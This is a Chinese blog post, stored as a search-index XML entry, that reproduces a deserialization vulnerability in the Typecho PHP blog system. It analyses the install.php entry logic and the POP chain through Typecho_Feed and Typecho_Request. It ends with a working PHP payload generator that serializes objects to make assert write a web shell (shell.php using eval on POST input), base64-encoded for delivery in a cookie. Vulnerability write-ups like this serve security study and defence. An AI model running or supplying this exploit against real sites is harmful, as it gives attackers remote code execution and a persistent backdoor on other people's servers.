<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[typecho反序列化漏洞复现]]></title>
    <url>%2F2017%2F10%2F29%2Ftypecho%2F</url>
    <content type="text"><![CDATA[typecho反序列化漏洞复现0X00 前言Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。 0X01. 漏洞版本V1.1-15.5.12-beta以前 0X02 漏洞分析反序列化可控点：install.php 229~235行该博客程序判断是否安装的代码如下12345678910111213141516171819//判断是否已经安装if (!isset($_GET['finish']) &amp;&amp; file_exists(\__TYPECHO_ROOT_DIR__ . '/config.inc.php') &amp;&amp; empty($_SESSION['typecho'])) &#123; exit;&#125;// 挡掉可能的跨站请求if (!empty($_GET) || !empty($_POST)) &#123; if (empty($_SERVER['HTTP_REFERER'])) &#123; exit; &#125; $parts = parse_url($_SERVER['HTTP_REFERER']); if (!empty($parts['port'])) &#123; $parts['host'] = "&#123;$parts['host']&#125;:&#123;$parts['port']&#125;"; &#125; if (empty($parts['host']) || $_SERVER['HTTP_HOST'] != $parts['host']) &#123; exit; &#125;&#125; 这里的判断逻辑有点滑稽，参数中含有finish并且Referer是内网即可进入install.php。。。既然能进入install.php,那么现在先决条件已具备，接着分析。 这里有一个反序列化操作，而参数从cookie获取，可控。 想到构造POP链。既然是序列化，免不了利用对象，于是跟进Typecho_Db对象看到这里对传入的参数\$adapterName进行了字符串拼接操作，如果$adapterName是一个实例化对象，就会触发__tostring魔法方法，全局搜索发现__tostring方法出现在以下三个类中： Typecho_FeedTypecho_ConfigTypecho_Db_Query 分别跟进后发现只有Typecho_Feed类可利用，可利用地点如下：在290行，如果screenName是不可访问变量，便会调用__get()魔法方法，搜索__get()方法，有好几处，分析后发现在Typecho_Request类中可以利用。在该类中__get方法调用了get方法，而在get方法中又调用了_applyFilter方法 跟进该方法醒目的array_map函数和call_user_func函数。。。至此POP链已经构造完成。 0X03 Payload&lt;?php class Typecho_Feed{ private $_type = &apos;RSS 2.0&apos;; private $_items; public function __construct($a) { $this-&gt;_items[] = array(&apos;author&apos;=&gt;$a); } } class Typecho_Request{ private $_params = array(&apos;screenName&apos;=&gt;&apos;file_put_contents(&apos;shell.php&apos;, &apos;&lt;?php @eval($_POST[tharavel]);?&gt;&apos;)&apos;); private $_filter = array(&apos;assert&apos;); } $payload1 = new Typecho_Request(); $payload2 = new Typecho_Feed($payload1); $exp = array(&apos;adapter&apos; =&gt; $payload2, &apos;prefix&apos; =&gt; &apos;typecho&apos;); echo base64_encode(serialize($exp));]]></content>
  </entry>
</search>